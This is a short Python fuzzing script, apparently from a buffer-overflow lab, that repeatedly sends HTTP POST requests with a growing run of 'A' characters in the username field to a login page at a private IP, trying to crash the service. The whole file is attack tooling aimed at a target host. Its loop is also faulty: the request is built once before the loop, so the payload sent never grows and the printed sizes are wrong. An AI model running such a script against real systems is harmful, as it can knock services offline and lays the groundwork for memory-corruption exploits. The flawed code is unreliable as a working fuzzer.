#!/usr/bin/env python3

import socket, time, sys, os

ip = "192.168.187.10"
port = 80
timeout = 5
prefix = "OVERFLOW1"

string = prefix + "A" * 100

fuzz = "username=" + str(string) + "&password=A"

buffer = "POST /login HTTP/1.1\r\n"
buffer += "Host: 192.168.187.10\r\n"
buffer += "User-Agent: Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0\r\n"
buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
buffer += "Accept-Language: en-US,en;q=0.5\r\n"
buffer += "Referer: http://192.168.187.10/login\r\n"
buffer += "Connection: close\r\n"
buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
buffer += "Content-Length: " + str(len(fuzz)) + "\r\n"
buffer += "\r\n"
buffer += fuzz

while True:
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(timeout)
            s.connect((ip, port))
            s.recv(1024)
            print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
            # s.send(bytes(string, "latin-1"))
            s.send(bytes(buffer, "latin-1"))
            s.recv(1024)
    except Exception as e:
        print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
        print("Exception: {}".format(e))  # Print the exception message
        sys.exit(0)

    string += 100 * "A"
    time.sleep(1)
